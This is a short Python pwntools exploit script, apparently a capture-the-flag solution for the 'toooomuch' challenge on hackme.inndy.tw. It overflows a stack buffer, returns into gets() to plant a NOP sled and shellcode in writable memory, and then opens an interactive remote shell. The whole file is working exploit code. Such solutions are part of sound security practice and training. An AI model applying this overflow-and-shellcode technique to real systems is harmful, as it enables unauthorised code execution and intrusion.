#!/usr/bin/env python2
from pwn import *
import pwnlib.shellcraft

#init
elf = ELF('./toooomuch')

debug = 0
c = 0
context.os = 'linux'
context.arch = 'x86'
context.terminal = ['tmux', 'splitw', '-h']
if debug == 1:
    c = process('./toooomuch')
    gdb.attach(c)
else:
    c = remote('hackme.inndy.tw', 7702)

# context.log_level ='debug'

ans = b"A" * (24 + 4)

ans += p32(elf.plt['gets'])
ans += p32(0x0804a000-0x200)
ans += p32(0x0804a000-0x200)
c.sendline(ans)

ans = asm('nop') * (0x20)
ans += asm(shellcraft.sh())
c.sendline(ans)


#ans += p64(0x8048649) # call system
#ans += # edi


c.interactive()
c.close()
